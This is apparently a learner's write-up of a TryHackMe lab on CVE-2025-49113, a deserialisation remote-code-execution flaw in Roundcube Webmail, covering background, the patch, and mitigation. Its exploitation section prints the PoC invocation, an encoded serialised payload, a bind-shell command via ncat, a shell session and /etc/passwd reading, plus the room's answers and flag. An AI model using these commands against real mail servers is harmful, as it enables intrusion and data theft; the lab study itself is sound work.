<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/af8d6079-137d-4c00-abf6-5aa9158002a2"><br>
June 17, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure,<br>
part of my <code>407</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
Exploit CVE-2025-49113 in a lab environment.<br>Click <a href="https://tryhackme.com/room/roundcubecve202549113">here</a>to access the "room".<br>
<img width="1200px" src="https://github.com/user-attachments/assets/e4eea893-3fed-472a-9a78-a203ddf49567"></p>

<h2> Task 1 . Introduction</h2>
<p><a href="https://roundcube.net/">Roundcube</a> is a free and open-source webmail project. It is very feature-rich and available in over eighty languages. Although its built-in features are rich, they can be further expanded through the support of third-party plug-ins.<br>

It mainly requires a web server with PHP support and an SQL server to run. Apache, Nginx, and Lighttpd, among others, can easily satisfy the web server requirements; MySQL, MariaDB, PostgreSQL, SQLite, and many others can satisfy the database requirements. This versatility makes Roundcube a very popular choice for webmail, especially among hosting providers.<br>

Recently, a vulnerability was discovered in Roundcube Webmail; it affects all versions 1.5.x and 1.6.x before 1.5.10 and 1.6.11. This vulnerability allows remote code execution (RCE) by authenticated users; in other words, valid credentials for the webmail are enough for the attacker to execute commands on the host system. This vulnerability has a CVSS 3.x severity score of 9.9, i.e., critical. Roundcube has already released versions 1.5.10 and 1.6.11 and strongly <a href="https://roundcube.net/news/2025/06/01/security-updates-1.6.11-and-1.5.10">Recommend updating</a>.<br>

This room will cover what makes this vulnerability possible and demonstrate exploitation in a lab environment.</p>

<h3 align="left"> Answer the question below</h3>

> 1.1. <em>Let’s dive in!</em><br><a id='1.1'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>

<h2> Task 2 . Technical Background</h2>
<p><code>Serialisation</code> is the process of converting an object, i.e., a class instance in PHP, Java, or Python, into a storable or transmittable format. This process is commonly used for storing objects in files or databases and for sending objects across the network, such as in APIs or cookies.<br>

A <code>deserialisation vulnerability</code> is a security flaw that occurs when an application deserialises untrusted or tampered data. <code>Deserialisation</code> is the process of converting data from a serialised format, such as a byte stream or a string, back into a program object. If this process is done insecurely, an attacker can manipulate the serialised data to execute arbitrary code or even escalate privileges, among other malicious actions.<br>

<a href="https://x.com/k_firsov/">Kirill Firsov</a> discovered a deserialisation vulnerability in Roundcube Webmail. They shared on their website the line of thought and <a href="https://fearsoff.org/research/roundcube">research that led tp discovery</a>; it is an interesting read. The vulnerability is caused by the <code>_from</code> property in the <code>upload.php</code> not being thoroughly checked for safe values before deserialisation.<br>

This vulnerability can be inferred in the <a href="https://github.com/roundcube/roundcubemail/commit/7408f31379666124a39f9cb1018f62bc5e2dc695#diff-e941e729aef9ce9f97dde65bc93b160e6f972cd8731e0dc2002cb34f95e5675bR35/">commits for version 1.5.10</a> and <a href="https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d">for version 1.6.11</a>. Even if you are not familiar with PHP, checking the commit lines and the comments will give you a good idea about how this vulnerability was fixed. In the screenshot below, you can easily infer that the additional lines now check if the URL parameter _from contains any unsafe characters.</p>

<h5 align="center"><img width="600px" src="https://github.com/user-attachments/assets/e1fafee2-6daf-468c-bcfe-e1c3f0f512c6"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h5>

<p>This vulnerability allows remote code execution via its insecure deserialisation. The attacker still needs to craft a payload so that its deserialisation leads to the desired outcome.</p>

<h3 align="left"> Answer the question below</h3>

> 2.1. <em>Take a couple of minutes to go through the commits for versions 1.5.10 and 1.6.11.</em><br><a id='2.1'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<p><a href="https://github.com/roundcube/roundcubemail/commit/7408f31379666124a39f9cb1018f62bc5e2dc695#diff-e941e729aef9ce9f97dde65bc93b160e6f972cd8731e0dc2002cb34f95e5675bR35/">commits for verion 1.5.10</a></p>

![image](https://github.com/user-attachments/assets/3057b3e6-72c3-4178-8122-4b2519528568)

<p><a href="https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d">commits for version 1.6.11</a></p>

![image](https://github.com/user-attachments/assets/305f9770-1f31-4d20-bf87-6cb7e53a0589)

<br>

<h2> Task 3 . Exploitation</h2>
<h3>Set up your virtual environment</h3>
<p>All machine details can be found at the top of the page.</p>
<p>Go ahead and start the virtual machine and the AttackBox so that you can follow along.<br>

The virtual machine has Roundcube Webmail version 1.6.10 installed. If you are unfamiliar with Roundcube Webmail, you can fire Firefox on the AttackBox and explore its interface. You can use Ellie’s credentials to access the webmail at <code>http://TargetIP/roundcube</code>.<br>

- Username: <code>ellieptic</code><br>
- Password: <code>Recated</code></p>

<h3>Explot Code</h3>
<p>A proof of concept (PoC) exploit code is published by FearsOff on their GitHub repository. The easiest way to follow along would be to download the exploit code using <code>git clone https://github.com/fearsoff-org/CVE-2025-49113</code>. This is shown in the terminal below.</p>

<p><em>AttackBox Terminal</em></p>

```bash
root@attackbox:~# git clone https://github.com/fearsoff-org/CVE-2025-49113
Cloning into 'CVE-2025-49113'...
remote: Enumerating objects: 8, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 8 (delta 1), reused 8 (delta 1), pack-reused 0 (from 0)
Unpacking objects: 100% (8/8), 7.31 KiB | 1.83 MiB/s, done.
root@attackbox:~# cd CVE-2025-49113/
root@attackbox:~/CVE-2025-49113# ls
CVE-2025-49113.php  rc_install.sh  README.md
```

<p>Note: The <code>CVE-2025-49113.php</code> is the PoC exploit. If you are a free user, the AttackBox does not have Internet access, and you need to use another means to get the above file into the AttackBox. One easy way would be to copy the file from its GitHub page, create a new file on the AttackBox using your preferred text editor, and save it with the extension <code>.php</code>.<br>

The <code>CVE-2025-49113.php</code> executes the necessary steps to get the payload of your choice executed on the target server. After retrieving a CSRF token and a session cookie, this PoC PHP script logs in using the provided username and password. The core steps of this script lie in the following:<br>

- Craft a malicious serialised PHP object<br>
- Embed the crafted object in the _from parameter<br>
- Send a POST request to the upload.php endpoint using the malicious _from parameter<br>

The received malicious parameter will be deserialised and executed on the server side.</p>

<h3>Executing the Exploit</h3>
<p>To run the PoC code, the following arguments need to be used: <code>php CVE-2025-49113.php target_url username password command</code>.

- The target_url should be replaced by Roundcube Webmail’s URL, i.e., <code>http://TargetIP/roundcube</code><br>
- The username and password are the valid credentials to access the webmail<br>
- The command is the “payload” that you want to be executed on the target server<br>

Let’s use <code>ncat -lvnp 4444 -e /bin/bash</code> to set a bind shell; this will make it easier to demonstrate the exploit and test whether it executed successfully. An example is shown in the terminal below.</p>

<p><em>AttackBox Terminal</em></p>

```bash
root@attackbox:~/CVE-2025-49113# php CVE-2025-49113.php http://TargetIP/roundcube ellieptic ChangeMe123 "ncat -lvnp 4444 -e /bin/bash"
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Retrieving CSRF token and session cookie...

### Authenticating user: ellieptic

### Authentication successful

### Command to be executed: 
ncat -lvnp 4444 -e /bin/bash

### Injecting payload...

### End payload: http://10.10.77.97/roundcube/?_from=edit-%21%C3%22%C3%3B%C3i%C3%3A%C30%C3%3B%C3O%C3%3A%C31%C36%C3%3A%C3%22%C3C%C3r%C3y%C3p%C3t%C3_%C3G%C3P%C3G%C3_%C3E%C3n%C3g%C3i%C3n%C3e%C3%22%C3%3A%C31%C3%3A%C3%7B%C3S%C3%3A%C32%C36%C3%3A%C3%22%C3%5C%C30%C30%C3C%C3r%C3y%C3p%C3t%C3_%C3G%C3P%C3G%C3_%C3E%C3n%C3g%C3i%C3n%C3e%C3%5C%C30%C30%C3_%C3g%C3p%C3g%C3c%C3o%C3n%C3f%C3%22%C3%3B%C3S%C3%3A%C33%C30%C3%3A%C3%22%C3n%C3c%C3a%C3t%C3+%C3-%C3l%C3v%C3n%C3p%C3+%C34%C34%C34%C34%C3+%C3-%C3e%C3+%C3%2F%C3b%C3i%C3n%C3%2F%C3b%C3a%C3s%C3h%C3%3B%C3%23%C3%22%C3%3B%C3%7D%C3i%C3%3A%C30%C3%3B%C3b%C3%3A%C30%C3%3B%C3%7D%C3%22%C3%3B%C3%7D%C3%7D%C3&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload

### Payload injected successfully

### Executing payload...
```

<p>It is worth mentioning that the exploit may take a minute or two to respond and sometimes the script gives an error message despite the payload successfully executing on the target. In one attempt, we got the following error message; however, the bind shell was set up successfully, and we could connect to it from the AttackBox.</p>

<p><em>AttackBox Terminal</em></p>

```bash
PHP Warning:  file_get_contents(http://TargetIP/roundcube/): failed to open stream: HTTP request failed! in /root/CVE-2025-49113/CVE-2025-49113.php on line 240
### Error: CSRF token not found in response body
```

<p>On the AttackBox, you must connect to the bind shell listening on port <code>4444</code>.</p>

<p><em>AttackBox Terminal</em></p>

```bash
root@attackbox:~# nc TargetIP 4444
pwd
/var/www/html/roundcube
whoami
www-data
```

<h3 align="left"> Answer the questions below</h3>

> 3.1. <em>One of the users has the first name of Maggie; what is her last name?</em> Hint : <em>Check the /etc/passwd file.</em><br><a id='3.1'></a>
>> <strong><code>Byte</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/9ddce25c-64ca-4cae-929c-d59367fd9be3)

![image](https://github.com/user-attachments/assets/c823eeb2-d3ee-4ad6-b159-a3ff1a88316e)

```bash
:~# git clone https://github.com/fearsoff-org/CVE-2025-49113
...
:~# ls
CVE-2025-49113
:~# CVE-2025-49113# ls
CVE-2025-49113.php  rc_install.sh  README.md
:~# CVE-2025-49113# php CVE-2025-49113.php http://TargetIP/roundcube ellieptic Redacted 'ncat -lvnp -e /bin/bash'
```

![image](https://github.com/user-attachments/assets/ceffb2a6-d463-4e94-b6d8-8f1d91d751f7)

![image](https://github.com/user-attachments/assets/54841143-f2af-4ba3-86e0-200be2f3ba1c)

<p>Error ... despite the error message it worked.</p>

![image](https://github.com/user-attachments/assets/dfa0c592-4f0e-4b82-a5b6-4b59540c8d34)

<br>

> 3.2. <em>What is the value of the flag saved in <code>/etc</code>?</em><br><a id='3.2'></a>
>> <strong><code>THM{ICE_CUBE_DESERIALISATION}</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/c68d591d-9a84-42d4-adb0-562f2791755b)

<br>

<h2>Task 4 . Conclusion and Mitigation</h2>
<p>This vulnerability only requires valid webmail credentials and works with default installations. The exploit can be tricky to detect, considering it can easily pass as regular traffic. Considering the severity of the exploit, users running 1.5.x and 1.6.x are recommended to update to 1.5.10 and 1.6.11, respectively. If updating is infeasible for some reason, one mitigation would be to <a href="https://www.vicarius.io/vsociety/posts/cve-2025-49113-roundcube-mitigation-script">block</a> <code>upload.php</code>.</p>

<h3 align="left"> Answer the question below</h3>

> 4.1. <em>For other rooms that cover recent vulnerabilities, you might want to check the <a href="https://tryhackme.com/module/recent-threats">Recent Threats</a> module. If you want to learn more about deserialisation vulnerabilities, we recommend the <a href="https://tryhackme.com/jr/insecuredeserialisation">Insecure Deserialisation</a> room.</em><br><a id='4.1'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>
<br>

![image](https://github.com/user-attachments/assets/6437d7cf-a775-4b94-899d-e78e28ebd3ff)

![image](https://github.com/user-attachments/assets/e700e607-cd63-4579-964c-9bbd95670b98)


<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| June 17 2025      | 407      |     199ᵗʰ    |      5ᵗʰ     |     298ᵗʰ   |     6ᵗʰ    |  108,501 |    785    |     63    |

</div>

![image](https://github.com/user-attachments/assets/048ffde2-a63d-433f-9630-e572247da98e)

![image](https://github.com/user-attachments/assets/85eb47a3-eb38-4705-8256-d4c22e585384)

![image](https://github.com/user-attachments/assets/f16beabb-80b3-4dca-8fe3-d23f6e718a3e)

![image](https://github.com/user-attachments/assets/e9af76c0-cb5e-4a64-8e5c-ba1df802f1ce)

![image](https://github.com/user-attachments/assets/41c79b3c-7387-4d6a-897c-022677c2ac46)
